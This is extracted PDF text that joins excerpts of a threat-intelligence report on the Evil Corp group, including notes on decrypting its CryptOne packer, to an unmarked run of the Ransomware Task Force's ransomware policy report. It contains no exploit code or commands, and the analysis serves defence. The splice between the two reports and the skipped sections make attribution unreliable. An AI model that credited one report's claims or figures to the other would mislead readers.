protector.\n\nBased on our assessment we believe that it is highly likely that this strain is derived from the same \ncodebase and belongs to the same EC lineage. \n\n\n\n3 2SANCTIONS BE DAMNED | FROM DRIDEX TO MACAW, THE EVOLUTION OF EVIL CORP\n\nCRYPTONE: THE PACKER\n\nCryptOne (also known as HellowinPacker) is a special packer in use by Evil Corp up till mid-2021.\n\nCryptOne appears to have first been noticed in 201531.

It is considered to be one of the ‘more problematic topics in \nthe threat intelligence community. The documented ties with the Russian FSB, the US indictments \nand the OFAC sanctions are probably the main reasons behind such controversy. Clustering EC \nactivity is demonstrably difficult considering that the group has changed TTPs several times in \norder to bypass sanctions and stay under the radar. In this research we connect the dots in the EC \necosystem, cluster malware, document EC’ activities and provide insight into their TTPs. \n\nFirst, we assess it is almost certain that EC’s ransomware variants were all developed by the same \n‘factory’, as there is significant code reuse between all the ransomware variants. Our temporal \nanalysis demonstrated that all the operations are tightly connected and synchronized; we assess \nit is almost certain there is a single entity which owns the entire attack chain, from resource \ndevelopment to ransomware deployment. Whether the group operates a RaaS model for a trusted \nnumber of affiliates is still an open question.\n\nEC’s TTPs demonstrate their advanced capability to adapt and persist in victim environments. From \nthe ransomware perspective, they implemented specific techniques to evade EDR and lower detection. \nThe partial rewrite in native API and the custom implementation of polymorphism - relying on the \ninsertion of a wide range of no-op-codes in Hades malware - are clear elements of their capability, not \ncommonly found in the cybercrime threat landscape. From a detection standpoint, it would be fruitful \nto improve detection of defense evasion TTPs in order to reduce blind spots.\n\nFrom a strategic standpoint, EC poses a serious threat to organizations due to their capabilities: the \nability to maintain a high level of operational security, to evade detection, and last but not least the \nability to ‘change their skin’ (ransomware signature, TTPs) in a very short period of time. All these \nelements provide a solid understanding of the modus operandi of this group and their capabilities. The \nadoption of SocGholish as an initial access tool and Koadic as a fileless post exploitation framework, \nfurther demonstrates how this cluster relies on uncommon tools to stay undetected.Victimology \nremains an open point due to the lack of shared intelligence. This is also a side effect of the OFAC \nsanctions, which presents unique challenges for incident response firms involved in such cases. Public \nattribution to EC is a sensitive matter for the aforementioned reasons. Moreover, EC’s operators have \nadopted victim anonymity since the deployment of Hades ransomware, removing victim information \nfrom the ransom note. This lowers the chances of organizations being discovered if they have fallen \nvictim to EC.\n\n\n\n4 5SANCTIONS BE DAMNED | FROM DRIDEX TO MACAW, THE EVOLUTION OF EVIL CORP\n\nThe alleged ties with the Russian government, the low volume of operations, the high level of \noperational security place this threat actor in a somewhat unique, hybrid position between espionage \nand cybercrime. This hybrid position is exemplified by the lacklustre monetization strategy of the \ngroup, suggesting motives that go beyond financial gain. The group’s main motivations present \nthe most important open question for the intelligence community. Some speculations claim EC is \nconducting espionage, masquerading as financial crime through extortion. Some speculate that EC \nreceives portions of a Russian black budget to finance activities that cannot directly link back to State \nactivity. Nevertheless, continued research on the group needs to continue to elicit the motivations of \nthe threat group. \n\nHistorically, EC presents two distinct modus operandi: botnet operation to conduct mass spam \ncampaigns primarily through Dridex (and derivatives); and since 2017, Big Game Hunting in low-\nvolume ransomware operations using BitPaymer. These 2 distinct tactics they have practiced over time \ndemonstrate the level of sophistication and adaptability of this actor, a relatively unique characteristic \nof a cybercrime threat actor.\n\nWe cannot be certain of exactly how EC will continue to evolve and target organizations. However, \nwe assess it is likely they will continue to advance their tradecraft, finding new methods of evading \ndetection and misleading attribution.

CRYPTONE\nMassive unpacking of CryptoOne packed samples can be found here. CryptOne unpacking \nmethod consists of two stages: \n\n1.\t Decrypts and executes embedded shellcode.\n2.\t Shellcode decrypts and executes embedded executables.\n\n \nCryptOne gets chunks of the encrypted data, which are separated by junk. \n\nExample Memory Dump:\n\n•\t 0x5EE00, Encrypted size.\n•\t 0x4011CA, Address of encrypted data\n•\t 0x4D/”M”, Junk data\n•\t 0x14, Junk size\n•\t 0x7A, Chunk Size \n\n \nAfter removal of the junk data, , the decryption starts with a simple XOR-Key which increases \nby 0x4 in each round. The initial XOR-Key is 0xA113.\n\nFig 31\n\nhttps://github.com/SentineLabs/Crypt1_IOCs\n\n\n5 9SANCTIONS BE DAMNED | FROM DRIDEX TO MACAW, THE EVOLUTION OF EVIL CORP\n\nOnce the shellcode is decrypted, we can slightly observe the string “This program cannot be \nrun in DOS mode” where this data contains an executable which requires a second decryption.\n\nFig 32\n\nSimilar to previous decryption, this time the shellcode decrypts the embedded binary.\n\nFig 33\n\nFig 34\n\n\n\n6 0SANCTIONS BE DAMNED | FROM DRIDEX TO MACAW, THE EVOLUTION OF EVIL CORP\n\nThe shellcode allocates and copies the encrypted executable and starts the decryption loop, \nonce it finishes, jumps to the EntryPoint and executes the unpacked sample.\n\nAt this stage we can observe strings related to the unpacked sample.\n\nFig 35\n\nFig 36\n\n\n\n6 1SANCTIONS BE DAMNED | FROM DRIDEX TO MACAW, THE EVOLUTION OF EVIL CORP\n\nInfoSec works on a rapid iterative cycle where new discoveries occur daily and authoritative \nsources are easily drowned in the noise of partial information.

This report details a \ncomprehensive strategic framework for tackling the dramatically increasing and evolving threat of \nransomware, a widespread form of cybercrime that in just a few years has become a serious national \nsecurity threat and a public health and safety concern.\n\nRansomware is not just financial extortion; it is a crime that transcends business, government, \nacademic, and geographic boundaries. It has disproportionately impacted the healthcare industry \nduring the COVID pandemic, and has shut down schools, hospitals, police stations, city governments, \nand U.S. military facilities. It is also a crime that funnels both private funds and tax dollars toward \nglobal criminal organizations. The proceeds stolen from victims may be financing illicit activities \nranging from human trafficking to the development and proliferation of weapons of mass destruction.\n\nTackling ransomware will not be easy; there is no silver bullet for solving this challenge. Most \nransomware criminals are based in nation-states that are unwilling or unable to prosecute this \ncybercrime, and because ransoms are paid through cryptocurrency, they are difficult to trace.  \nThis global challenge demands an “all hands on deck” approach, with support from the highest  \nlevels of government. \n\nCountless people around the world are already working tirelessly to blunt the onslaught of \nransomware attacks. But no single entity alone has the requisite resources, skills, capabilities,  \nor authorities to significantly constrain this global criminal enterprise. \n\nFor this reason, we convened the Ransomware Task Force — a team of more than 60 experts  \nfrom software companies, cybersecurity vendors, government agencies, non-profits, and academic \ninstitutions — to develop a comprehensive framework for tackling the ransomware threat.\n\nOur goal is not only to help the world better understand ransomware, but to proactively and \nrelentlessly disrupt the ransomware business model through a series of coordinated actions,  \nmany of which can be immediately implemented by industry, government, and civil society. Acting  \nupon a few of these recommendations will not likely shift the trajectory, but the Task Force is \nconfident that implementing all of them in coordination, with speed and conviction, will make a \nsignificant difference.\n\nWhile we have strived to be comprehensive, we acknowledge there will be areas we have not \naddressed, or on which we could not come to consensus. Prohibition of payments is the most \nprominent example; the Task Force agreed that paying ransoms is detrimental in a number of ways, \nbut also recognized the challenges inherent in barring payments. Just as we have been grateful to \nstand on the shoulders of those that came before us, we hope our efforts and investigations will fuel \nthe thinking and recommendations of those that come after us.\n\nA Note from the RTF Co-Chairs\n\n\n\nIST 4Combating Ransomware\n\nWe urge all those with the ability to act to do so immediately. The ransomware threat continues to \nworsen by the day, and the consequences of waiting to respond could be disastrous. More than \nmoney is at stake; lives, critical infrastructure, public faith in the legitimacy of our institutions, the \neducation system, and in many ways, our very way of life depends on taking action.\n\nAs a final note, we would like to offer our sincere thanks to the members of the Ransomware Task \nForce, who responded to our call and generously dedicated their time and energy into developing the \nrecommendations included in this report.\n\nThe Working Group Co-Chairs of the Ransomware Task Force.\n\nJohn Davis,  \nPalo Alto  \nNetworks\n\nMegan Stifel,  \nGlobal Cyber  \nAlliance\n\nKemba Walden, \nMicrosoft\n\nPhilip Reiner,  \nInstitute for Security  \nand Technology\n\nJen Ellis,  \nRapid7\n\nChris Painter,  \nThe Global Forum  \non Cyber Expertise \nFoundation Board\n\nMichael Daniel,  \nCyber Threat \nAlliance\n\nMichael Phillips,  \nResilience\n\nA Note from the RTF Co-Chairs\n\n\n\nIST 5Combating Ransomware\n\nRansomware attacks present an urgent national security risk around the world. This evolving form \nof cybercrime, through which criminals remotely compromise computer systems and demand a \nransom in return for restoring and/or not exposing data, is economically destructive and leads to \ndangerous real-world consequences that far exceed the costs of the ransom payments alone. \n\nIn 2020, thousands of businesses, hospitals, school districts, city governments, and other institutions \nin the U.S. and around the world were paralyzed as their digital networks were held hostage by \nmalicious actors seeking payouts. The immediate physical and business risks posed by ransomware \nare compounded by the broader societal impact of the billions of dollars steered into criminal \nenterprises, funds that may be used for the proliferation of weapons of mass destruction, human \ntrafficking, and other virulent global criminal activity. \n\nDespite the gravity of their crimes, the majority of ransomware criminals operate with near-impunity, \nbased out of jurisdictions that are unable or unwilling to bring them to justice. This problem is \nexacerbated by financial systems that enable attackers to receive funds without being traced. \nAdditionally, the barriers to entry into this lucrative criminal enterprise have become shockingly low. \nThe “ransomware as a service” (RaaS) model, allows criminals without technical sophistication to \nconduct ransomware attacks. At the same time, technically knowledgeable criminals are conducting \nincreasingly sophisticated attacks.\n\nSignificant effort has been made to understand and address the ransomware threat, yet attackers \ncontinue to succeed on a broad and troubling scale. To shift these dynamics, the international \ncommunity needs a comprehensive approach that influences the behavior of actors on all sides of \nthe ecosystem, including deterring and disrupting attackers, shoring up preparation and response of \npotential victims, and engaging regulators, law enforcement, and national security experts. We also \nneed international cooperation and adoption of processes, standards, and expectations.\n\nThis report outlines a comprehensive framework of actions (48 in total) that government and industry \nleaders can pursue to significantly disrupt the ransomware business model and mitigate the impact \nof these attacks in the immediate and longer terms. These recommendations were collaboratively \ndeveloped by the Ransomware Task Force (RTF) — a broad coalition of volunteer experts from \nindustry, government, law enforcement, civil society, cybersecurity insurers, and international \norganizations — to provide a strategic framework for a systemic, global approach to mitigating the \nransomware problem. \n\nWhile we have identified some recommendations as priorities, we strongly recommend viewing the \nentire set of recommendations together, as they are designed to complement, and build on each other. \nThe strategic framework is organized around four primary goals: to deter ransomware attacks through \na nationally and internationally coordinated, comprehensive strategy; to disrupt the business model \nand reduce criminal profits; to help organizations prepare for ransomware attacks; and to respond to \nransomware attacks more effectively.\n\nExecutive Summary\n\nExecutive Summary\n\n\n\nIST 6Combating Ransomware\n\nCoordinated, international diplomatic and law enforcement efforts must proactively prioritize \nransomware through a comprehensive, resourced strategy, including using a carrot-and-stick \napproach to direct nation-states away from providing safe havens to ransomware criminals. \n\nThe United States should lead by example and execute a sustained, aggressive, whole of \ngovernment, intelligence-driven anti-ransomware campaign, coordinated by the White House. \nIn the U.S., this must include the establishment of 1) an Interagency Working Group led by the \nNational Security Council in coordination with the nascent National Cyber Director; 2) an internal \nU.S. Government Joint Ransomware Task Force; and 3) a collaborative, private industry-led \ninformal Ransomware Threat Focus Hub. \n\nGovernments should establish Cyber Response and Recovery Funds to support ransomware \nresponse and other cybersecurity activities; mandate that organizations report ransom payments; \nand require organizations to consider alternatives before making payments. \n\nAn internationally coordinated effort should develop a clear, accessible, and broadly adopted \nframework to help organizations prepare for, and respond to, ransomware attacks. In some under-\nresourced and more critical sectors, incentives (such as fine relief and funding) or regulation may \nbe required to drive adoption. \n\nThe cryptocurrency sector that enables ransomware crime should be more closely regulated. \nGovernments should require cryptocurrency exchanges, crypto kiosks, and over-the-counter (OTC) \ntrading “desks” to comply with existing laws, including Know Your Customer (KYC), Anti-Money \nLaundering (AML), and Combatting Financing of Terrorism (CFT) laws. \n\n1.\n\n5.\n\n3.\n\n2.\n\n4.\n\nPriority recommendations \n\nThe ransomware threat continues to worsen daily. The actions detailed in this report need to be \nenacted together as soon as possible, and must be coordinated at a national and international level \nin order to have the necessary impact. We understand the gravity of this challenge, but we believe \nthat if this framework is implemented in full, the international community could see a decrease in \nthe volume of these types of attacks in one year’s time. Proposing this framework is merely the \nfirst step, and the real challenge is in implementation. With every recommended action we aimed \nto work through the practical implications, and in most cases we present immediately actionable \nrecommendations. The Co-Chairs of the RTF welcome the opportunity to discuss these findings \nand recommendations further to help achieve these goals.\n\nThese priority recommendations are the most foundational and urgent; many of the other \nrecommendations were developed to facilitate or strengthen these core actions:\n\nExecutive Summary\n\n\n\nIST 7Combating Ransomware\n\nRansomware is a flourishing criminal industry that not only risks the personal and financial  \nsecurity of individuals, but also threatens national security and human life. Businesses, schools, \ngovernments, hospitals, and nearly every other type of institution are regularly targeted, disrupted, \nand held hostage. The problem has steadily grown worse in recent years, and in 2020, nearly  \n2,400 U.S.-based governments, healthcare facilities, and schools were victims of ransomware, \naccording to the security firm Emsisoft.1 Multiple organizations have issued reports on the costs  \nof ransomware, and while their exact figures vary, all consistently show a steady increase in the \nnumber of attacks — and damaging economic impact. \n\nIn 2020, nearly\nU.S.-based governments, \nhealthcare facilities, and schools \nwere victims of ransomware2,400\n\nIntroduction\n\nAverage downtime \ndue to ransomware \n\nattacks2 \n(Coveware)\n\nAverage days it takes \na business to fully \n\nrecover from an attack3 \n(Emsisoft)\n\nVictims paid in \nransom in 2020  \n\n— a 311% increase \nover the prior year4  \n\n(Chainalysis)\n\n$312,493  \nThe average payment \n\nin 2020 — a 171% \nincrease compared  \n\nto 20195 \n(Palo Alto Networks)\n\n21 \nDAYS\n\n287 \nDAYS\n\n$350 \nMILLION\n\nIntroduction\n\n\n\nIST 8Combating Ransomware\n\nRansomware as a National Security Threat \nThe costs of ransomware go far beyond the ransom payments themselves. Cybercrime is typically \nseen as a white-collar crime, but while ransomware is profit-driven and “non-violent” in the \ntraditional sense, that has not stopped ransomware attackers from routinely imperiling lives. \n\nThreats to Critical Infrastructure:  \nRansomware attacks have shut down the operations of critical national resources, including military \nfacilities. In 2019, a ransomware attack shut down the operations of a U.S. Coast Guard facility for \n30 hours,6 and in February 2020, a ransomware attack on a natural-gas pipeline operator halted \noperations for two days.7 Attacks on the energy grid, on a nuclear plant, waste treatment facilities, or \non any number of critical assets could have devastating consequences, including human casualties.\n\nRisks to Public Health:  \nHospitals and other medical centers are a favorite target for ransomware criminals. In 2020, 560 \nhealthcare facilities were hit by ransomware attacks in the U.S. alone.8 These incidents not only cost \nthe victims millions of dollars in recovery, but they also have led to delays in patient treatment, and \npossibly loss of life. In September 2020, a ransomware attack led to the failure of computer systems \nat Duesseldorf University Clinic, requiring critically ill patients to be relocated to other facilities, and \nin the United States, an attack caused delays in treatment for cancer patients at the University of \nVermont Medical Care and other facilities.9 \n\nIn October 2020, hackers compromised the computer networks of roughly a dozen medical centers \nacross the United States. These attacks forced the cancelations of surgeries and disruptions in \npatient care; the University of Vermont Medical Center (UVM) was forced to furlough or reassign \nabout 300 employees as the hospital’s networks were taken offline in the midst of the COVID \npandemic, and patients were turned away from scheduled cancer treatments and other medical \nprocedures. The company’s President and COO estimated the attack would cost roughly $64 million \nbefore systems were fully restored. \n\n“�It feels like we are all alone and no one understands  \nhow dire this is,” \n\n– UVM Nurse to the New York Times.10\n\nExtensive cyber vulnerabilities across the healthcare industry create potentially lucrative targets \nfor malicious ransom-seeking actors, driving the significant increase in attacks against healthcare \nfacilities. Government policy choices regarding ransomware should focus on this critical threat: \nstatistical analysis reveals that ransomware-driven delays in care in these healthcare systems \ninvariably contributes to a loss of life due to the inability of patients to receive timely care.11 This \nilluminates the risk to human life posed by these attacks – and yet the attackers continue to \nundertake these assaults with near impunity.\n\nSocietal Impact: Targeting the Health Care Sector\n\nIntroduction\n\n\n\nIST 9Combating Ransomware\n\nIn May 2019, a ransomware attack on the City of Baltimore took critical services offline. The city \nrefused to pay the ransom, but the recovery lasted several weeks and cost $18.2 million to restore \nsystems back to their original state.16 Beyond the financial burden on taxpayers and the shutdown of \nservices, the city’s inhabitants were no longer able to pay water bills, property taxes, or parking fines. \nSome residents who could not pay their bills saw their homes go into foreclosure. Databases tracking \nstreet drugs were knocked offline, people were unable to pay water bills and home sales were \ndelayed.17 The city’s 911 dispatch system was knocked offline, and emergency calls made during that \ntime were not recorded. The criminals threatened to publicly release data stolen during the attack \nto exert pressure on city officials to pay, in an early example of the “double extortion” tactic that has \nsince become prevalent.18 \n\nSocietal Impact: Cities Under Siege\n\nDiversion of Vital Public Resources:  \nRansomware attacks on municipal governments are common. Such attacks not only divert public \nresources into illicit economies, but the victims incur costs that far exceed the ransoms alone. For \nexample, in 2018, the City of Atlanta paid $50,000 in Bitcoin as ransom, but the total cost of the \nrecovery exceeded $2.6 million, as the city was forced to pay for digital forensics, increased staffing, \ncrisis communications, and other costs.12 A ransomware attack similarly debilitated the City of \nBaltimore, leading to a range of negative impacts. \n\nLoss of Data/Privacy:  \nRansomware criminals are increasingly expanding their attacks to include “double extortion,” whereby \nthey first demand ransom to de-encrypt an organization’s data, then threaten to release the data on \nto the internet unless additional ransom is paid. At the start of 2020, only one major ransomware \ngroup exfiltrated data for a second extortion, but by the end of the year, at least 17 other groups used \nthis tactic.13 The potential exposure of their data and ensuing legal liability (particularly in countries \nwith strict data security laws) may be a critical factor in leading some victims to pay the ransom.\n\nDisruption of Schools and Colleges:  \nThe education sector has become a top target: during 2020, nearly 1700 schools, colleges, and \nuniversities in the United States were impacted by ransomware.14 According to a report by the Federal \nBureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), and the \nMulti-State Information Sharing and Analysis Center (MS-ISAC), 57% of all reported ransomware \nattacks in August and September 2020 were targeted at K–12 schools.15 These attacks not only \ndisrupt the schools’ operations, but often include threats to leak confidential student data on the \ninternet.\n\nEconomic Impact:  \nRansoms paid by private firms siphon millions of dollars toward criminal enterprise every year. The \ntotal amount paid by ransomware victims increased by 311% in 2020, reaching nearly $350 million \nworth of cryptocurrency.19 However, the economic impacts go well beyond the costs of ransoms \n\nIntroduction\n\n\n\nIST 10Combating Ransomware\n\nFrom The Coveware Quarterly Ransomware Report\n\n2018 \nQ3\n\n2018 \nQ4\n\n2019 \nQ1\n\n2019 \nQ2\n\n2019 \nQ3\n\n2019 \nQ4\n\n2020 \nQ1\n\n2020 \nQ2\n\n2020 \nQ3\n\n2020 \nQ4\n\n250,000\n\n100,000\n\n200,000\n\n150,000\n\n50,000\n\n0\n\n5,\n97\n\n4\n\n6,\n73\n\n3\n\n12\n,7\n\n62 36\n,2\n\n95\n\n41\n,19\n\n8\n\n84\n,11\n\n6\n\n11\n1,\n\n60\n5\n\n17\n8,\n\n25\n4\n\n23\n3,\n\n81\n7\n\n15\n4,\n\n10\n8\n\nFIGURE 1  Average ransom in USD\n\nRansomware attacks on schools have devastating impacts, including loss of instructional time \nand the leakage of sensitive data. In early 2021, a ransomware attack on the Buffalo Public School \nsystem prevented 5,000 students from returning to in-person learning Monday and shut down online \nlearning for thousands more.20 \n\nSuch attacks also add to budgetary challenges for already under-resourced districts: when \nMississippi’s Yazoo County School District paid $300,000 as a ransom to recover files encrypted \nduring a ransomware attack, the cost equaled roughly 1.5% of the district’s annual budget.21\n\nThe targeting of schools is not limited to the United States. In March 2021, a ransomware attack left \n37,000 students in London and Essex without access to email or coursework. The attack targeted \nThe Harris Federation, which runs 50 primary and secondary schools in the UK.22 The perpetrators \nare suspected to have stolen personal data about the organization, including financial details, and \nposted it on the dark web.23\n\nSocietal Impact: K-12 Schools\n\nalone. Reported ransomware payments do not cover the costs associated with service downtime \nand recovery. Total remediation costs are typically several times a ransom payment and are often \nlarge enough to cripple many small businesses. In addition, money that flows to the criminal \nnetworks creates second- and third-order economic effects, since those revenues go on to fund \nother types of crime.\n\nIntroduction\n\n\n\nIST 11Combating Ransomware\n\nUnderstanding Ransomware\nRansomware is a sub-category of malware, a class of software designed to cause harm to a \ncomputer or computer network. CISA defines ransomware as “an ever-evolving form of malware \ndesigned to encrypt files on a device, rendering any files and the systems that rely on them unusable. \nMalicious actors then demand ransom in exchange for decryption. Ransomware actors often target \nand threaten to sell or leak exfiltrated data or authentication information if the ransom is not paid.”24\n\nRansomware proliferates in diverse ways, including through exploitation of vulnerabilities, as well as \nsocial engineering tactics, such as “phishing” emails that deceive employees within an organization \nto open attachments that launch the malware that then infects their networks. Once launched, the \nmalware may connect to a command-and-control server to enable the criminals to move laterally \nacross networks and encrypt and/or exfiltrate the organization’s data. Ransomware victims are \ntypically prompted with a screen informing them that their data has been encrypted, with instructions \nfor how to restore their systems by sending payment via cryptocurrency. Not all attacks result in \ndata encryption, but most do: a 2020 survey of 5000 IT managers found that 51% had been hit by \nransomware in the last year, and the criminals succeeded in encrypting the data in 73% of these \nattacks, according to Sophos.25\n\nExample of a ransomware lock screen\n\nRansomware victims are typically prompted with a screen informing them that their data has been encrypted, \nwith instructions for how to restore their systems by sending payment via cryptocurrency.\n\nIntroduction\n\n\n\nIST 12Combating Ransomware\n\nRansom Payments\nA number of factors can influence whether victims agree to pay the ransom demand, including \nwhether they have cyber insurance, the quality of their data backups, and the estimated costs of the \nsystem outage. Legal considerations may also come into play: in the United States for example, firms \nthat pay ransoms (and their facilitators) may find themselves in violation of regulations imposed by \nthe Office of Foreign Assets Controls (OFAC).26\n\nSurveys of global IT professionals have found that, of the organizations reporting a ransomware \nattack, 27% of victims chose to pay the ransom requested, with small variations at the regional level \nin terms of the average amounts paid $1.18 million in APAC, $1.06 million at EMEA, and $0.99 million \nin the United States).27\n\nVictims may be more likely to pay if they are concerned their data will be made public. As a result, the \ntheft and threat of public disclosure of sensitive data — a tactic known as “double extortion” or “data \nexfiltration” — has become an increasingly common tactic for ransomware attackers, as it intensifies \nthe pressure on entities already struggling to regain operational capacity and protect sensitive data.\n\nFIGURE 2  \nPercent of attacks involving data exfiltration\n\nPercent of cases without data exfiltration \nPercent of cases with data exfiltration\n\nFrom The Coveware Quarterly Ransomware Report\n\n2020 \nQ1\n\n2020 \nQ2\n\n2020 \nQ3\n\n2020 \nQ4\n\n50\n\n100\n\n75\n\n25\n\n0\n\nA 2020 survey by Sophos of \n5000 IT managers found that\n\nhad been hit by ransomware in the last year\n\n51%\n\n73% \nof these attacks.\n\nCriminals succeeded in \nencrypting the data in\n\nIntroduction\n\n\n\nIST 13Combating Ransomware\n\nCyber Insurance and Ransomware \nThe cyber insurance industry sells policies to firms to cover losses in the event of a ransomware attack \nor other incident. Cyber insurance policies often include specific coverages for ransomware, including \nfor business interruption losses, data restoration costs, incident response costs, and for a ransom \npayment, if one is made. \n\nRansomware attacks are the most common reported cyber insurance claim, according to Coalition, a \ncyber insurance firm. In the first half of 2020, Coalition observed a 260% increase in the frequency of \nransomware attacks among its policyholders, with the average ransom demand increasing 47% to an \naverage of $338,669.28 \n\nThe role of cyber insurance in ransomware is complicated. Some argue that the “backstop” support \nof insurance encourages ransomware attackers, as victims may be more likely to pay if their costs \nare covered.29 There is evidence that attackers may target companies specifically because they have \ninsurance; in an interview, a ransomware criminal affiliated with the prominent syndicate REvil (also known \nas Sodinokibi) stated that targeting firms with cyber insurance was “one of the tastiest morsels.”30\n\nOn the other hand, more mature insurance providers typically require that their clients adhere to strong baseline \nsecurity practices, which can significantly reduce the disruption caused by a ransomware attack. They \nalso connect victims to recovery experts and law enforcement, and can leverage a variety of market tools, \nsuch as co-insurance, to incentivize security standards and discourage organizations from paying ransoms. \n\nThe challenge is that not all cyber insurers are at the same level of sophistication, and some may even \nview a lack of security baseline requirements to be a unique selling proposition. Given the prevalence \nand cost of ransomware claims, it is rational to expect that the cyber insurance industry will eventually \nadopt security baseline requirements broadly as a standard expectation for insurability. When this \nbecomes the status quo, insurers will play a more definitively positive role both in driving adoption of \nbetter cyber hygiene, and in providing an important safety net for victims of attacks. However, it will take \ntime to achieve this maturity across the industry. \n\nAcknowledging the ways in which cyber insurance may influence or shape organizational behavior \nand the ransomware “kill chain”, the insurance-related recommendations in this report are designed to \nenhance the sector’s role in supporting comprehensive public and private action against ransomware, \nwhile accelerating the cyber insurance market’s maturity, solvency, and expertise.

The use of cryptocurrency adds to the challenge of identifying ransomware criminals, \nas payments with these currencies are difficult to attribute to any individual. Often the money does \nnot flow straight from ransomware victim to criminal; it travels through a multi-step process involving \ndifferent financial entities, many of which are novel and are not yet part of standardized, regulated \nfinancial payments markets.\n\nRansomware criminals typically demand that victims send their ransom payments via Bitcoin, \nbut after receiving the payment in a designated digital “wallet” (software that stores public and \nprivate keys), the criminals typically obfuscate these funds as quickly as possible to avoid detection \nand tracking. Their methods include “chainhopping,” which involves exchanging funds in one \ncryptocurrency for another using any of a variety of cryptocurrency exchanges. The funds can \nbe extremely difficult to trace after they have been exchanged, and to further shield themselves, \nransomware actors may use money-mule service providers to set up accounts, or use accounts with \nfalse or stolen credentials.\n\nRansomware criminals can also obscure their transactions through cryptocurrency “mixing services,” \nwhich muddy the public ledger by mixing in legitimate traffic with illicit ransomware funds. Some \ngroups will also demand payments in currencies known as “privacy coins,” such as Monero, that \nare designed for privacy and make payments untraceable.31 However, privacy coins have not \nbeen adopted as widely as might be expected because they are not as liquid as Bitcoin and other \ncryptocurrencies, and due in part to regulation, this payment method may become increasingly \nimpractical. \n\nCryptocurrencies add to the challenge of ransomware because they are considered to be \n“borderless.” The cryptocurrency community is expressly focused on building a set of technologies \ndesigned to reduce compliance and financial process costs. After obfuscating the extorted funds, \nransomware criminals may either withdraw the funds into hard cash, or because cryptocurrencies \nhave become increasingly common (and their value has been steadily rising), they may keep their \nprofits in cryptocurrency and use them to pay for other illicit activities.\n\nWhile cryptocurrencies are difficult to trace, blockchain analysis can help interpret public blockchain \nledgers and, with the proper tools, government agencies, cryptocurrency businesses, and financial \ninstitutions can understand which real-world entities transact with each other. Blockchain analytic \ncompanies are able to show that a given transaction took place between two different cryptocurrency \nexchanges, for example, or between a cryptocurrency exchange and an illicit entity, such as a \nsanctioned individual or organization. With blockchain analysis tools and Know Your Customer (KYC) \ninformation, law enforcement can gain transparency into blockchain activity in ways that are not \npossible in traditional finance.\n\nSee Appendix B: The Cryptocurrency Payment Process, for a more detailed overview of how \nransomware payments work, including where interventions could occur and how they could \nundermine the ransomware business model.\n\nIntroduction\n\n\n\nIST 15Combating Ransomware\n\nA Global Challenge\nRansomware is a global challenge, as institutions in all sectors around the world are being \nincreasingly targeted. A single attack can also rapidly spread across borders, intentionally or \notherwise: the 2017 WannaCry ransomware attack affected 150 countries.32 A survey by security \nfirm Sophos33 found the nations with the highest percentage of organizations reporting ransomware \nattacks in 2020 were India, Brazil, Turkey, Belgium, Sweden, and the United States. However, \nransomware attacks occur frequently in Russia, Saudi Arabia, China, and nearly every other nation.34 \n\nReducing the ransomware threat will require global cooperation due to the highly decentralized \nnature of cryptocurrency, dispersed nature of the criminal networks involved, the internet’s basic \ninfrastructure, and the differing legal and regulatory regimes around the world. Ransomware \ncriminals are able to game the system by moving their operations to where legislation and cybercrime \nenforcement are the most lenient. International institutions have begun to tackle this challenge: in \nOctober 2020, for example, finance ministers from the Group of Seven (G7) called upon nations to \nimplement Financial Action Task Force standards to reduce ransomware and other cybercrime.35 \nHowever, more must be done to improve global cooperation, reduce safe havens, align international \nstandards, and ramp up enforcement.\n\nIntroduction\n\nFIGURE 3  2020/21 Confirmed Organization Ransomware Incidents\n\nAustralia\n15+ Events\n\nBrazil\n9+ Events\n\nUnited Kingdom\n29+ EventsUnited States\n\n370+ Events\n\n1 (log scale) 350+\n\n2020/21 Confirmed Organization\nRansomware Incidents\n\nSources: Palo Alto Unit 42; Scitum; Cloudian; Black Fog; Recorded Future Incidents include victim organizations with data \npublished on leak sites or with publicly disclosed ransoms.\n\n\n\nIST 16Combating Ransomware\n\nFIGURE 4  Ransomware “Kill Chain”\n\nThe Threat Actors\nThe profitability of ransomware has attracted a diverse set of malicious actors, who have built a \nthriving and evolving criminal ecosystem. While different ransomware attacks may seem similar, they \nare often executed by a diverse array of attackers with highly variable motivations. Some are \norganized into ransomware “gangs,” which, like other organized crime units, operate in one cohesive \nteam while developing and executing attacks. \n\nRecent years have seen the rise of the “ransomware as a service” (RaaS) business model. Some \nnational governments have used ransomware to advance their strategic interests, including evading \nsanctions. This diversity of threats increases the complexity of attributing and countering ransomware \nattacks and highlights the need for broad pressure along the entire ransomware kill chain. \n\nPRE-EXPLOIT\n\nPRE-EVENT POST-EVENTEVENT\n\nRecon Dev/Test Sales/\nResales\n\nInfrastructure \nSetup & Ops\n\nInitital \naccess\n\nRansomware \nLive\n\nRecovery\n\nPOST-EXPLOIT\n\nSource: World Economic Forum’s Partnership against Cybercrime in collaboration with Accenture\n\nRansomware-as-a-Service\nCarrying out a ransomware attack does not require technical sophistication. “Ransomware as a \nservice” (RaaS) is a business model that provides ransomware capabilities to would-be criminals \nwho do not have the skills or resources to develop their own malware. In 2020, two-thirds of the \nransomware attacks analyzed by cybersecurity firm Group-IB were perpetrated by cyber criminals using \na RaaS model.36 This “as a service” model follows similar evolutions in the mainstream software and \ninfrastructure industries, which have seen success from “software as a service” and “infrastructure as a \nservice” business models.\n\nIn the RaaS model, there are at least two parties who establish a business relationship: the developer and \nthe affiliate. The developer writes the malicious program that encrypts and potentially steals the victim’s \ndata. The developer then licenses this malware to the affiliate for a fixed fee or a share of successful \nransom payments. The affiliate executes the attack and collects the ransom, potentially also including \nadditional business arrangements, like purchasing exploits or using cryptocurrency brokers and washers. \n\nIntroduction\n\n\n\nIST 17Combating Ransomware\n\nThe 2017 NotPetya attack highlighted how this form of cybercrime can have far-reaching \nconsequences. The estimated financial losses exceeded $10 billion, but the true scale of the damage \nwas far greater. Though the attack was not strictly ransomware as it was not motivated by profit, \nit did leverage ransomware code, cause the same type of disruptive impact, and present a screen \ndemanding a ransom. \n\nThe attack started in Ukraine, where computer systems at two major airports, bus stations, railways, \nthe postal service, and media companies were taken hostage. It infected ATM machines and \npayment systems, and for the first time after 31 years, the radiation monitors at Chernobyl shut \ndown, forcing workers in hazmat suits to manually monitor radiation levels.41 \n\nThe destructive virus was designed to spread, and soon shut down factories in locations as far away \nas Tasmania. NotPetya affected Merck’s production of critical vaccines, and the company had to dip \ninto emergency stockpiles to meet demand. Doctors in Virginia and Pennsylvania were locked out of \npatient records and prescription systems. \n\nTwo years after the attack, railway and shipping systems in Ukraine still were not working at full \ncapacity. Packages that had been lost due to ransomware were still not found, and senior citizens \ncontinued to miss pension 